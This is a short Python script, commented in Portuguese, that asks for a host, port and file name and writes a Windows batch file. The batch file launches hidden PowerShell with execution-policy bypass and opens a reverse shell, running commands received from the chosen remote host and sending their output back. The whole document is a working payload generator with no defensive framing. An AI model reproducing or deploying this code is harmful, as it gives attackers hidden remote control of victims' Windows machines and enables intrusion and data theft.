# Solicita ao usuário o HOST, a PORTA e o NOME DO ARQUIVO
host = input("Digite o HOST: ")
port = input("Digite a PORTA: ")
filename = input("Digite o nome do arquivo (com extensão .bat): ")

# Verifica se o nome do arquivo termina com .bat
if not filename.endswith(".bat"):
    filename += ".bat"

# Conteúdo do script .bat de reverse shell
bat_script = f"""@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
exit
"""

# Cria o arquivo .bat com o conteúdo do reverse shell
with open(filename, "w") as file:
    file.write(bat_script)

print(f"Arquivo {filename} criado com sucesso!")
